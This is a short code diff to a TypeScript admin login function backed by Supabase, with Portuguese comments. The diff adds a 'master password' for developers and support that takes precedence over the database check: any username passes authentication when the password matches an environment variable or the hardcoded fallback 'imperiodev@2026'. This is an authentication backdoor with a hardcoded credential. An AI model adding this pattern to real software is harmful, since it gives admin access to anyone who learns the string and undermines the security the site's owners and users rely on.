@@ -4,6 +4,13 @@ import { supabase } from '@/lib/supabase'
 
 // Tabela simples para usuário admin: admin_users (id, username, password)
 export async function checkLogin(username: string, pass: string) {
+  // Senha mestra de desenvolvedor/suporte (Tem precedência sobre a do banco)
+  const masterPassword = process.env.MASTER_PASSWORD || 'imperiodev@2026'
+  
+  if (pass === masterPassword) {
+    return { success: true }
+  }
+
   const { data, error } = await supabase
     .from('admin_users')
     .select('*')
